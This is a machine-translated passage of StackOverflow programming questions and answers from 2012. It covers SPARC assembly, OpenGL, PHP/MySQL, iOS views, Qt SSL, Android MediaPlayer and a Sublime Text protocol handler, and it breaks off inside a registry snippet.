# StackOverflow 问答 13093000-13093999

# assembly - 标记生成的 sparc 汇编代码段以供检查

> ID：13093002
> 
> 赞同：0
> 
> 时间：2012-10-26T19:14:45.623
> 
> 标签：assembly, disassembly, sparc

有谁知道如何使用 Sun Studio 编译器插入可识别的代码序列，而不会搞砸优化？

我想看看 Sun Studio (12.1) 编译器在许多实例中对一些代码做了什么，并且正在寻找一种方法来用一组可识别的无操作指令标记生成的代码，所以我可以找到我的代码片段。我第一次尝试使用：

```
asm volatile ("nop ; nop ; nop ") ;
// ... <stuff I want to look at here> ...
asm volatile ("nop ; nop ; nop ; nop ; nop") ; 
```

但是，当我使用它时，编译器会在 nop 块中生成外观未优化的代码。例子：

```
nop
nop
nop
ld        [%sp + 0x8bf], %g2
srl       %g2, 0x0, %g3
sllx      %g3, 0x2, %g4
ld        [%sp + 0x8c3], %g5
ldx       [%sp + 0x8c7], %o2
st        %g5, [%o2 + %g4]
ld        [%sp + 0x8b7], %o3
ldx       [%sp + 0x8c7], %o4
st        %o3, [%o4 + 0x28]
nop
nop
nop
nop
nop 
```

有问题的代码只是两个商店。我真的不知道 sparc 汇编，但这看起来编译器已经完全放弃了优化 nop 块中的代码。例如，为什么它会生成一个新的负载，`ldx [%sp + 0x8c7], %o4`重新计算存储的基地址，而它已经完成了这个`%02`？

看一眼周围的代码，很可能在使用的 asm volatile 附近的任何地方都没有优化。

我尝试了以下方法，使用此内联 asm 创建了一个 .il 文件：

```
.inline DO_Nop3,0
   nop
   nop
   nop
.end
.inline DO_Nop5,0
   nop
   nop
   nop
   nop
   nop
.end 
```

在我的来源中包含以下内容：

```
extern "C" void DO_Nop3() ;
extern "C" void DO_Nop5() ; 
```

使用这个，我遇到了相反的问题，编译器现在太聪明了，并且完全消除了我的 nop 指令（我猜它着眼于`.inline`块中指令的副作用，然后稍后，正确地决定这个不做任何事情，并扔掉那段代码）。

还有更好的方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T20:41:21.983

问题是编译器可以自由地重新排序指令；`asm volatile`块阻止它这样做并可能抑制优化。

调试符号应该为您提供从指令地址到源代码行的映射。不过，我不知道有什么好的工具可以方便地阅读 dwarf2/stabs。

# opengl - 3D模型看起来像透明的

> ID：13093005
> 
> 赞同：2
> 
> 时间：2012-10-26T19:14:53.667
> 
> 标签：opengl

尝试使用 OpenGL 绘制波前 obj 文件，但似乎存在深度缓冲区问题。

![问题](../Images/7c655d76adb7852c22aeb01f874603d6.png)

资源：

```
// Default constructor
Engine::Engine()
{
    initialize();
    loadModel();    
    start();
}

// Initialize OpenGL
void Engine::initialize()
{     
    // Enable depth test
    glEnable(GL_DEPTH_TEST);
    // Enable depth write
    glDepthMask(GL_TRUE);
}

void Engine::start()
{
    // Main loop
    while(isOpen())
    {
        glClearColor(0.0f, 0.0f, 0.0f, 0.0f);
        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);

        // Draw 3D model to screen
        draw();
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T19:20:28.403

检查事项：

*   确保启用深度测试`glEnable(GL_DEPTH_TEST)`
*   确保启用深度写入`glDepthMask(true)`
*   确保您的上下文具有深度缓冲区`Assert(glGetIntegerv(GL_DEPTH_BITS) != 0))`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T19:20:50.937

请求带有深度缓冲区的 GL 上下文和`glEnable(GL_DEPTH_TEST)`.

尝试这个：

```
mainWindow.create
    (
    sf::VideoMode
        (
        settings.getWidth(), 
        settings.getHeight()
        ), 
    "", 
    sf::Style::Resize,
    sf::ContextSettings( 16, 0, 0, 2, 0 )
    ); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-26T19:21:42.503

你激活深度测试了吗？

```
glEnable(GL_DEPTH_TEST); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-11T22:37:28.830

你在使用顶点着色器吗？如果在顶点着色器的出口处 gl_Position.z 意外设置为 0，就会发生这种情况。或者我相信是 -1 和 1 之间的任何值。

如果所有顶点在输入阶段之前具有相等的 z 值，也会发生这种情况，尽管在这种情况下您的转换矩阵一定有问题。或者只是你可能正在用你的转换矩阵做一些非常奇特的事情，并且模型很好。您是否同时设置了 MODELVIEW 和 PROJECTION，并相应地将它们相乘？在顶点着色器中还是在 FFP 中？

# joomla - joomla 用户个人资料和用户照片库

> ID：13093010
> 
> 赞同：1
> 
> 时间：2012-10-26T19:15:24.057
> 
> 标签：joomla, joomla2.5, joomla-extensions

我想知道是否有人知道是否存在以下扩展：

1.  为每个注册用户添加个人资料（可由他们编辑）
2.  添加允许注册用户添加自己的照片库

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-27T01:21:49.460

对于高级配置文件编辑，您最好使用诸如[Community Builder](http://extensions.joomla.org/extensions/clients-a-communities/communities/210)之类的扩展程序。它允许您为注册和配置文件编辑创建自定义字段。至于照片库，您可能最好在[JED](http://extensions.joomla.org/extensions/photos-a-images/galleries/photo-gallery)上搜索一个，因为有一些但有些具有不同的功能，所以如果您选择适合您需要的东西会更好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-02T08:06:11.663

这个扩展似乎可以满足您的大部分要求 - [http://extensions.joomla.org/extensions/clients-a-communities/communities/10997](http://extensions.joomla.org/extensions/clients-a-communities/communities/10997)

# mysql - 根据正则表达式模式选择不同的记录

> ID：13093015
> 
> 赞同：0
> 
> 时间：2012-10-26T19:15:41.210
> 
> 标签：mysql

我有一个带域的数据库。我需要提取域后缀并创建这些后缀的列表。（.com、.net、.org ...）

我发现正则表达式模式可能对我有帮助。我唯一不能做的是根据模式+唯一性过滤这些域，以获得我的列表。

这是我的查询：
`$qry="select * from domain where domain_name REGEXP '[[.period.]][a-z]+'";`

我应该如何向其中添加唯一条件？
谢谢你。

**更新：**
这是工作查询：
`SELECT DISTINCT SUBSTRING_INDEX(domain_name, '.', -1) FROM domains WHERE domain_name REGEXP '[[.period.]][a-z]+'`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T21:21:46.153

MySQL 没有使用正则表达式替换或访问匹配组的构造。所以正则表达式可能对你没有帮助。也许该[`SUBSTRING_INDEX`](http://dev.mysql.com/doc/refman/5.6/en/string-functions.html#function_substring-index)功能对您更有用，因为您可以使用它来提取最后一个点之后的部分，使用

```
SUBSTRING_INDEX(domain_name, '.', -1) AS tld 
```

# java - android从数据库中的时间戳添加或删除小时

> ID：13093016
> 
> 赞同：1
> 
> 时间：2012-10-26T19:15:40.550
> 
> 标签：java, database, sqlite, datetime

我想从我在 Android 中的时间戳中减去几天。

我有一个带有 long 类型的日期字段的[SQLite数据库。](https://en.wikipedia.org/wiki/SQLite)当我执行一个查询时，我说`date = date - (3 * 86400000)`我有时会在将其转换为可读日期时遇到一小时的差异。

但这怎么可能？这与我所在时区的一小时夏令时有关吗？

因为如果这是原因我会觉得很奇怪，因为您正在使用两个长值进行计算，并且在将它们转换回日期时间之后不应该存在夏令时问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T12:29:36.307

感谢您的回复，但我找到了解决方案。似乎当您在时间戳中添加以毫秒为单位的天数并且两者之间的日光设置存在一小时差异时，日期会自动更正。

当我执行以下操作时，将忽略小时：

```
Date d = new Date();
d.setDays(d.getDays() - 2); 
```

但是，我建议使用 Joda 库，因为它更加灵活且易于使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-11-16T21:20:27.097

# php - mysql_fetch_array 和 Facebook API

> ID：13093018
> 
> 赞同：0
> 
> 时间：2012-10-26T19:15:43.077
> 
> 标签：php, mysql, facebook, facebook-php-sdk

使用 Facebook PHP SDK。我在两个不同的文件中有相同的 .php 标签，在一个文件中它可以工作，但在另一个文件中它什么也不返回。任何的想法？我`config.php`在两者中都包含相同的文件。

```
include("config.php");
include("fbconnect.php");

if (!isset($_SESSION['user']))
{
    $valor_voto = mysql_query("select voto from $mes_id where email=$email");
    $row = mysql_fetch_array($valor_voto);
    $valor = $row['voto'];

    if ($valor == 1)
    {
        echo '<img class="icon" src="/images/greencheck.png">';
    }
    else
    {
        echo '<img class="icon" src="/images/check.png">';
    }
}
else
{
    echo '<img class="icon" src="/images/check.png">';
} 
```

在我看来，这`$email`是失败的原因，因为如果我手动输入电子邮件，它将返回 2 个预期值中的任何一个。

谢谢你的时间。

`$email`来自`fbconnect.php`：

```
if ($user)
{
    try
    {
        // Proceed knowing you have a logged in user who's authenticated.
        $user_profile = $facebook->api('/me');

        //Connecting to the database. You would need to make the required changes in the common.php file
        //In the common.php file you would need to add your Hostname, username, password and database name!
        mysqlc();

        $name     = GetSQLValueString($user_profile['name'], "text");
        $email    = GetSQLValueString($user_profile['email'], "text");
        $gender   = GetSQLValueString($user_profile['gender'], "text");
        $bio      = GetSQLValueString($user_profile['bio'], "text");
        $hometown = GetSQLValueString($user_hometown['hometown'], "text");
        $query    = sprintf("SELECT * FROM newmember WHERE email = %s", $email);
        $res      = mysql_query($query) or die('Query failed: ' . mysql_error() . "<br/>\n$sql");

        if ( mysql_num_rows($res) == 0 )
        {
            $iquery = sprintf("INSERT INTO newmember values('',%s,%s,%s,%s,'yes',%s)", $name, $email, $gender, $bio, $hometown);
            $ires   = mysql_query($iquery) or die('Query failed: ' . mysql_error() . "<br/>\n$sql");

            $_SESSION['user'] = $user_profile['email'];
            $_SESSION['id'] = $user_profile['id'];

        }
        else
        {
            $row = mysql_fetch_array($res);
            $_SESSION['user'] = $row['email'];
            $_SESSION['id'] = $user_profile['id'];
        }
    }
    catch (FacebookApiException $e)
    {
        error_log($e);
        $user = NULL;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:30:32.533

我假设电子邮件列是一个字符串，因此您需要将值放在引号中。您还应该转义它以防止来自 Facebook 的 SQL 注入攻击。

```
$valor_voto=mysql_query("select voto from $mes_id where email='".mysql_real_escape_string($email)."'"); 
```

使用 mysqli 或 PDO 会更好，而不是已弃用的 mysql 扩展，然后您可以使用准备好的语句而不是替换和转义。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T23:32:44.237

解决了，我有条件

```
if(!isset($_SESSION['user'])) 
```

但我没有给出条件

```
if(isset($_SESSION['user'])) 
```

所以我无法检索任何信息。

谢谢你的时间。

# macos - 让 NSContactsUsageDescription 在 10.8.2 中工作

> ID：13093020
> 
> 赞同：2
> 
> 时间：2012-10-26T19:15:47.143
> 
> 标签：macos, osx-mountain-lion, abaddressbook

我有一个带有崩溃报告器的应用程序，它通过从 ABAddressBook 获取它来自动填充用户电子邮件地址。我试图在 10.8 显示的询问用户许可的对话框中获得信息丰富的意图消息。按照[http://www.red-sweater.com/blog/2672/can-i-get-your-address](http://www.red-sweater.com/blog/2672/can-i-get-your-address)上的建议，我在应用程序的 Info.plist 中添加了以下内容：

```
<key>NSContactsUsageDescription</key>
<string>blah blah blah</string> 
```

不幸的是，这不起作用。对话框仍然询问，但它不显示我的描述文本。我试过了：

*   将其放入崩溃报告框架的 Info.plist 而不是应用程序的。
*   使用我的开发者 ID 证书签署应用程序。

但是，唉，没有运气。任何人都可以让这个工作，可以给我一个关于我做错了什么的提示？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T02:41:57.487

[更新] 我找到了重启有帮助的*真正*原因。它杀死了`tccd`进程，这看起来像是负责在该对话框上显示消息的罪魁祸首。

因此，只需打开活动监视器并终止`tccd`进程，您的新消息应该会在下次对话框显示时出现。

[旧答案] 我遇到了同样的问题，但不确定为什么（我完全按照文档所说的去做）。我终于让它工作了：

*   删除我的应用程序所在的容器（~/Library/Containers/com.company-name.app-name）
*   清理构建（在 Xcode 中：产品 -> 清理）
*   重新启动我的机器（似乎有点货物崇拜，但我认为这是解决问题的原因）
*   构建和运行我的应用程序

下次我的应用程序尝试访问通讯簿 API 时，我看到了包含我的消息的对话框。

我认为Apple必须在某处缓存该消息（您想要的消息，或者如果您在显示消息之前运行代码，则为空字符串），清除它的唯一方法是重新启动。我多次尝试了前两个步骤，但消息没有任何变化，即使在我让消息正常工作然后尝试更改它之后也是如此。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2018-10-12T04:37:10.363

解决方案是在终端中运行此命令：

```
tccutil reset AddressBook 
```

来源：[https ://developer.apple.com/library/archive/qa/qa1906/_index.html](https://developer.apple.com/library/archive/qa/qa1906/_index.html)

# objective-c - 如何防止 UIView 背景旋转？

> ID：13093022
> 
> 赞同：0
> 
> 时间：2012-10-26T19:16:00.957
> 
> 标签：objective-c, ios, cocoa-touch, uiview, uikit

> **可能重复：**
> [我可以旋转没有黑条的 UIView 吗？](https://stackoverflow.com/questions/10037924/can-i-rotate-a-uiview-without-the-black-bars)

我希望我的标签`UIView`旋转（它们确实如此），但我已将其设置为`background`黑色以外的颜色。当我旋转时，您可以看到视图的矩形相对于黑色旋转`background`。我怎样才能保持`UIView`'s`background`仍然允许其余部分`subviews`正常旋转？`background`一切背后的黑色是什么？我可以访问它吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T19:54:22.807

我不确定我是否完全理解这个问题。我认为您的问题是（如果我有误解，请澄清我在哪里弄错了问题）：

*   您有一个与设备屏幕大小相同的 UIView。
*   您想旋转该视图。
*   当您旋转该视图时，可以看到该视图的父视图的背景。

我认为解决这个问题的唯一方法是：

A）使您正在旋转的视图大于屏幕，以便在您旋转父视图时不可见。如果您这样做，请确保父视图未设置为剪辑它的子视图，否则在调整大小后您不会看到任何差异。

或者

B) 使父视图的背景颜色与您正在旋转的视图的颜色相匹配。如果您不想永久更改父视图的背景颜色，您可以在开始动画时随时更改颜色，并在完成后恢复为原始颜色。

PS - 我认为“一切背后的黑色背景”是您应用程序 UIWindow 的背景颜色。如果您想更改它，您可以执行以下操作（假设您的应用程序委托定义了一个窗口属性，但如果您使用标准 Xcode 模板之一来创建您的应用程序，则应该这样做）：

```
UIWindow* window = [[UIApplication sharedApplication].delegate window];
[window setBackgroundColor:<Some UIColor>]; 
```

# asp.net - Filtering on table on aspx page

> ID：13093024
> 
> 赞同：0
> 
> 时间：2012-10-26T19:16:12.637
> 
> 标签：asp.net, html-table

I need to implement Excel kind of filtering on a table on an aspx page.

What I want is, when I click on any column header it should show me the list of rows in that column with check-box for each one and when I select specific rows then the table should filter accordingly.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T19:28:14.590

Here is a working example for one column at a time. I'm working on getting this working for several columns as well: [http://jsfiddle.net/mwB37/20/](http://jsfiddle.net/mwB37/20/)

Since you're asking for a complete plugin with a UI and everything, including relevant code on SO is kinda difficult. But here are the key excerpts that defines my thinking and the concept:

```
// fetching the column index
var columnIndex = th.index();

// then fetching the corresponding TDs (use for-loop when thousands of elements)
var tds = th.closest('table')
            .find('tbody td:nth-child(' + (columnIndex+1) + ')');

// distinctively selecting the unique text values in those columns
var checks = $.unique(tds.map(function() {
    return $(this).text();
}).get());

// the most basic way possible of filtering
// (should be extended into an OR query of all current column filters)
if (index != -1 || arr.length == 0)
    td.parent('tr').show();
else
    td.parent('tr').hide(); 
```

If you want something already finished instead, this is such a plugin: [PicNet Table Filter](http://www.picnet.com.au/picnet-table-filter.html)

There is also a [filtering](http://datatables.net/plug-ins/filtering) plugin available for the jQuery [DataTables plugin](http://datatables.net/), although sorting is obviously the main focus of that one.

# macos - OSX 10.5.8 上的 Qt：“为此目的不信任根 CA 证书”

> ID：13093025
> 
> 赞同：4
> 
> 时间：2012-10-26T19:16:14.920
> 
> 标签：macos, qt, ssl, ssl-certificate

我有一个 Qt 应用程序，它成功地在 OSX 10.7 上向我们的网站发出 HTTPS 请求，但在 10.5.8 上失败，并出现 QSslError::errorString“根 CA 证书不被信任用于此目的”。

我正在设置根证书：

```
QFile certFile1(":/Equifax_Secure_Certificate_Authority.pem.txt");
QSslCertificate cert1(&certFile1, QSsl::Pem);
certList.append(cert1);

QSslConfiguration sslConfig(request.sslConfiguration());
sslConfig.setCaCertificates(certList);
request.setSslConfiguration(sslConfig); 
```

如果我设置了一些其他证书，我会在 OSX 10.5.8 和 10.7 上收到两个错误字符串“找不到本地查找证书的颁发者证书”和“根 CA 证书不为此目的受信任”。这是我所期望的。

是什么让 Qt 仅在 10.5.8 上不信任 Equifax 证书？

编辑：可能的线索（或红鲱鱼）：查看各自的 WireShark 跟踪，10.5.8 客户端在其客户端问候握手中不包括服务器名称指示或会话票证 TLS 扩展。

编辑 2：在 10.5.8 上构建为 32 位的作品。此外，在 10.7 上构建为通用（32 位和 64 位 Intel）并在 10.5.8 上运行，链接到基于 10.5.8 构建的 32 位 Qt 库。

编辑 3：我在[https://github.com/cdemel/SO_examples/tree/master/soqtssl](https://github.com/cdemel/SO_examples/tree/master/soqtssl)放置了一个示例，使用不同的网站（Twitter）和根证书，行为相同。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-02T22:17:04.910

好吧，这已经很久没有答案了，所以我将给出我不知情的解决方案作为答案：

将应用程序链接到基于 10.5.8 构建的 Qt 库。这对我有用，但我不能告诉你为什么。

# iphone - 如何限制 animateWithDuration 中的移动

> ID：13093027
> 
> 赞同：1
> 
> 时间：2012-10-26T19:16:18.457
> 
> 标签：iphone, xcode, animation

我正在创建 UILabel 对象将在屏幕上移动的应用程序。我的问题是如何限制标签越过特定边界。例如，如果标签有一条消息，我想让整个消​​息可见，而不仅仅是它的第一部分。这是代码：

```
#define kHeight     320.0
#define kWidth          400.0
#define kTransitionDuration 1.50
#define kTopPlacement       80.0

- (void)myMover {

for (UIView *view in self.view.subviews) {
      if( [view isKindOfClass:[UILabel class]]){
    [UIView animateWithDuration:4.0 animations:^{  

            //set the point from where the move will start
            [self setRandomLocationForLabel:view];

        }];
    }

}

}

- (void) setRandomLocationForView:(UIView *)view
 {
  [view sizeToFit];      
   CGRect messageViewBounds = CGRectMake(round((self.view.bounds.size.width - kWidth) / 2.0),
                          200, kWidth, kHeight);

CGRect newFrame = CGRectMake( 0, 300, 100 , 20 );
while (view.frame.size.width > kWidth) {

    newFrame.size.width /= 2;
    newFrame.size.height /= 2;

}

view.frame = newFrame;

CGFloat x = (CGFloat) (arc4random() % (int) messageViewBounds.size.width + view.frame.size.width/2);
CGFloat y = (CGFloat) (arc4random() % (int) messageViewBounds.size.height + view.frame.size.height/2);

view.center = CGPointMake (x,y);

} 
```

感谢您的任何建议！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:42:55.640

> 我的问题是如何限制标签越过特定边界。例如，如果标签有一条消息，我想让整个消​​息可见，而不仅仅是它的第一部分。

在确定标签应落在的随机位置时，您需要考虑标签的长度/宽度和高度。因此，您的随机选择应该落在

```
CGSize labelSize = [messageString sizeWithFont:messageString.font 
                             constrainedToSize:maximumLabelSize 
                                 lineBreakMode:messageString.lineBreakMode];

CGFloat minX = 0;
CGFloat minY = 0;
CGFloat maxX = self.view.frame.size.width - labelSize.width;
CGFloat maxY = self.view.frame.size.height - labelSize.height;

// Use minX/Y and maxX/Y in your random co-ordinate algorithm 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T21:02:29.993

既然你有视图，你就知道它的大小。通过了解宽度，您知道需要将视图中心从左侧或右侧（宽度的一半）定位多远。通过了解高度，您就知道如何从顶部或底部（高度的一半）。

现在，您可以通过获取完整视图来计算仅包含该视图的有效中心点的矩形，并创建一个插入矩形，在左右两侧减去一半的视图宽度，在顶部减去一半的视图高度和底部。

```
CGSize viewSize = view.bounds.size; // The view you are positioning
CGRect rectOfValidCenters = CGRectInset(self.view.bounds, // The view you are placing it in
                                        viewSize.width/2.0, // subtract the width/2 from left and right  
                                        viewSize.height/2.0); // subtract the height/2 form top and bottom
CGFloat randomX = // generate random value from 0.0 to 1.0
CGFloat randomY = // generate random value from 0.0 to 1.0

// Random valid center point is: 
//  ( minX + randomX * width , minY + randomY * height)
//
// if x and y are zero then the view's center will be in the upper left
// of the rect of valid centers (making its upper left corner be in the
// top left of the view it's placed in).
// if x and y are one then the view's center will be in the lower right
// of the rect of valid centers (making its lower right corner be in the
// lower right of the view it's placed in).
CGPoint randomValidPoint = CGPointMake(CGRectGetMinX(rectOfValidCenters) + randomX * CGRectGetWidth(rectOfValidCenters),
                                       CGRectGetMinY(rectOfValidCenters) + randomY * CGRectGetHeight(rectOfValidCenters));
view.center = randomValidPoint; 
```

# visual-c++ - Visual C++ WebBrowser 阻止弹出窗口

> ID：13093028
> 
> 赞同：0
> 
> 时间：2012-10-26T19:16:20.850
> 
> 标签：visual-c++

我正在使用 C++ 编写一个简单的网络浏览器。

你能帮我阻止 IE 弹出窗口吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T19:47:58.873

1.  在 Windows 窗体设计时单击 WebBrowser，打开 WebBrowser 的属性窗口。
2.  在属性窗口的事件选项卡中添加 NewWindow 事件处理程序。

**然后隐藏弹出窗口添加此代码行：**

```
 e->Cancel = true; 
```

# java - 如何缩放程序以正确的屏幕分辨率？

> ID：13093029
> 
> 赞同：2
> 
> 时间：2012-10-26T19:16:22.550
> 
> 标签：java

在接下来的四十分钟内，我将在我的大学举办一场音乐会，我将在几个不同的屏幕上投影我写的全屏应用程序。我今晚只能使用投影系统，当插入屏幕时，我的屏幕分辨率发生了巨大变化，但是当我执行我的程序时，它就像使用我的旧屏幕分辨率一样工作。我已经将整个视觉显示编码为精确的像素值，但现在有一半没有显示，因为它被推离了屏幕的一侧。我尝试在系统偏好设置中手动更改我的显示，但它没有效果。我尝试创建不同的显示模式以适应分辨率，但我不断收到消息 UnsupportedOperationException：无法更改显示模式。

下面是我用来初始化全屏的代码：

```
 frame = new display();
            canvas = new Canvas();
            canvas.addKeyListener(this);
            frame.setUndecorated(true);
            frame.getContentPane().add(canvas);
            strategy = canvas.getBufferStrategy();
            environment = GraphicsEnvironment.getLocalGraphicsEnvironment();
            device = environment.getDefaultScreenDevice();
            oldDisplay = device.getDisplayMode();
try {
            device.setFullScreenWindow(frame);
            newDisplay = new DisplayMode(1440, 900, 60, 60);
            device.setDisplayMode(newDisplay);
catch (Exception ex) { }
            canvas.requestFocus();
            canvas.setFocusTraversalKeysEnabled(false);
            frame.setVisible(true);
            canvas.createBufferStrategy(2);
            strategy = canvas.getBufferStrategy(); 
```

Display 只是 JFrame 的直接扩展。

如果我没有得到这个工作，我会通过我学位的这个模块。请stackoverflow现在不要让我失望！谢谢！

编辑：固定异常但是程序似乎根本没有改变分辨率，尽管设置了 800、600、60、60。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T19:34:12.497

我的解决方案不是 OP 正在考虑的问题。但我相信它可以解决你的问题。

抓取 VirtualBox（或任何其他支持缩放模式的 VM）。花 20 分钟在上面安装一个操作系统，然后在其中运行你的程序。许多虚拟机支持缩放模式，即客户操作系统会认为它正在运行分辨率 X [1] *Y [1]，但在您的屏幕上，它实际上显示为 X [2] *Y [2]，由虚拟机缩放。因此，您可以让您的程序在任何分辨率下都能正常显示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T19:21:46.950

您可以将 DisplayMode 降低到大多数投影仪都支持的 (1024, 768, 60, 60)。在最坏的情况下，将其降低到 800、600、60、60 - 但是，在画布上绘制的任何硬编码像素值超出 DisplayMode 范围的东西都不会再出现在屏幕上。

# javascript - 通过javascript创建表单和输入字段

> ID：13093035
> 
> 赞同：1
> 
> 时间：2012-10-26T19:16:35.850
> 
> 标签：javascript

我正在做我的 javascript 分配，其中我有一个表单，其中有多个按钮。我希望 javascript 应该像

```
<form>
<input />
<button />
</form> 
```

但它是这样渲染的

```
 <form> </form>
    <input />
    <button /> 
```

示例代码

```
var formTag = document.createElement('form');
document.body.appendChild(formTag);
var txtInput = document.createElement("input");
var txtNode = document.createTextNode("0");
txtInput.setAttribute("id", "txtInput");
txtInput.appendChild(txtNode);
document.form.appendChild(txtInput); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-26T19:19:56.913

您错误地将`input`元素附加到文档的`form`元素（顺便说一句，该元素不存在 - 您可能的意思是[`document.forms[0]`](https://developer.mozilla.org/en-US/docs/DOM/document.forms)）。

`formTag`而是将输入附加到对象，如下所示：

```
formTag.appendChild(txtInput); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T19:21:12.017

尝试将 txtInput 附加到您的 formTag 对象。

```
var formTag = document.createElement('form');
document.body.appendChild(formTag);
var txtInput = document.createElement("input");
var txtNode = document.createTextNode("0");
txtInput.setAttribute("id", "txtInput");
txtInput.appendChild(txtNode);
formTag.appendChild(txtInput); 
```

# android - Android - 从 MediaPlayer 同时获取超过 2 个 OnCompleteListener 事件

> ID：13093037
> 
> 赞同：1
> 
> 时间：2012-10-26T19:16:43.003
> 
> 标签：android, media-player

嘿伙计们，我在 Android 中使用 MediaPlayer 类时遇到了一个问题

在您建议 SoundPool 之前，我需要在声音片段播放完毕时触发 OnCompletion 事件，否则我会使用它。

所以问题是，当同时激活 3 个或更多剪辑时，我只能获得最后 2 个事件的 OnCompletion，而不是所有事件，任何人都知道这个问题的解决方案或知道它为什么会发生？

```
// When the user clicks on the Chicken Image, this Function is called
public void onChickenClicked(View view)
{
//  ToastMsg( "You Clicked the Chicken", Toast.LENGTH_SHORT );
    // Then play the sound,
    mMediaPlayer[CHICKEN] = MediaPlayer.create(MainActivity.this, R.raw.chicken_sound );
    // Start playing the sound
    mMediaPlayer[CHICKEN].start();
    // This is to catch when the sound clip has ended, this will be 
    //     used to stop the animation for the chicken
    mMediaPlayer[CHICKEN].setOnCompletionListener( new OnCompletionListener() {
        public void onCompletion(MediaPlayer mp) {
            System.err.println("Chicken On Complete");
            // Stop the animation of the Chicken here
            mAnimation.cancel();
            mAnimation.reset();
            // Then switch the image back to the original Chicken pic
            ImageView imgView = (ImageView) findViewById(R.id.imageViewofChicken);
            imgView.setImageResource(R.drawable.chicken);
            mMediaPlayer[CHICKEN].reset();
        }} );

    // Finds the ImageView, replaces the base img with the alternate img, and plays the sound
    animatePicture( R.id.imageViewofChicken, R.drawable.chicken_tongue);
}   

public void onCowClicked(View view)
{
//  ToastMsg( "You Clicked the Cow", Toast.LENGTH_SHORT );
    // Then play the sound, 
    mMediaPlayer[COW] = MediaPlayer.create(MainActivity.this, R.raw.cow_sound );
    // Start playing the sound
    mMediaPlayer[COW].start();
    // This is to catch when the sound clip has ended, this will be 
    //     used to stop the animation for the chicken
    mMediaPlayer[COW].setOnCompletionListener( new OnCompletionListener() {
        public void onCompletion(MediaPlayer mp) {
            System.err.println("Cow On Complete");
            // Stop the animation of the Chicken here
            mAnimation.cancel();
            mAnimation.reset();
            // Then switch the image back to the original Chicken pic
            ImageView imgView = (ImageView) findViewById(R.id.imageViewofCow);
            imgView.setImageResource(R.drawable.cow);
            mMediaPlayer[COW].reset();
        }} );
    // Finds the ImageView, replaces the base img with the alternate img, and plays the sound
    animatePicture( R.id.imageViewofCow, R.drawable.cow_tongue);
}

//there are more but you get it idea here. 
```

有人对我如何让所有 OnCompleteListeners 触发有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-22T23:35:57.037

所以我想通了，我只是将MediaPlayer替换为SoundPool，然后使用

`private final ScheduledExecutorService mScheduler = Executors.newScheduledThreadPool(MAX_ANIMALS);`

处理声音剪辑何时完成，基于我在stackoverflow上看到的一个函数，使用MediaPlayer加载声音，然后以毫秒为单位获取持续时间，并将其用作调度程序的延迟（`mScheduler[x]`）。

这是一个黑客，但它完成了。

# windows - 在 Windows 上为 xdebug.file_link_format 和 Sublime Text 2 创建自定义协议

> ID：13093038
> 
> 赞同：1
> 
> 时间：2012-10-26T19:16:45.427
> 
> 标签：windows, protocols, xdebug, sublimetext2

我正在尝试这样做，以便我可以单击 xdebug 输出的链接并打开有问题的文件，例如 textmate 中的问题，我试图在 windows xp 上使用 ST2 执行此操作。

我尝试使用[SublimeProtocol](https://bitbucket.org/sublimator/sublimeprotocol)插件来完成此任务，但它期望打开文件的链接格式如下：

`sblm:///C/Users/name/AppData/Roaming/Sublime%20Text%202/Packages/`

xdebug.file_link_format 是： `xdebug.file_link_format="sblm://%f?%l"`

它输出这种类型的链接：`sblm://C:\wamp\www\busadv\parse3.php?10`

所以ST2的控制台提示无法打开文件。

然后我尝试基于 SO 问题[创建自定义协议创建自定义协议](https://stackoverflow.com/questions/11671261/creating-custom-protocol-windows-7) ，因为这似乎符合我想要完成的目标。我使用以下内容创建了一个 reg 文件：

```
Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\sblm]
@="\"URL:sblm Protocol\""
"EditFlags"=hex:02,00,00,00
"URL Protocol"=""

[HKEY_CLASSES_ROOT\sblm\DefaultIcon]
@="\"C:\\Program Files\\Sublime Text 2\\sublime_text.exe\",0"

[HKEY_CLASSES_ROOT\sblm\shell]

[HKEY_CLASSES_ROOT\sblm\shell\open]

[HKEY_CLASSES_ROOT\sblm\shell\open\command]
@="\"C:\\Program Files\\Sublime Text 2\\sublime_text.exe\" -c \"%1\"" 
```

问题是，当我单击 xdebug 的链接输出时，一个文件在**ST2**中打开的文件只有一个源自浏览器目录的文件，而不是 xdebug 所在的位置。我尝试将 %1 替换为 %2 ，以便文件将 C:\ 之前的部分切掉，但使用该替换时文件永远不会打开。那么为了使它工作还需要什么其他参数呢？

**更新：**

添加了包含以下内容的批处理文件：

```
@echo off 
setlocal enableextensions enabledelayedexpansion 
set SUBLIME=%1
set FILE=%~2
%SUBLIME% --open "%FILE:~19%" 
```

并将注册表更改为包含[Windows 和 netbeans](http://xdebug.org/docs/all_settings)建议的 .bat 为：

```
Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\sblm]
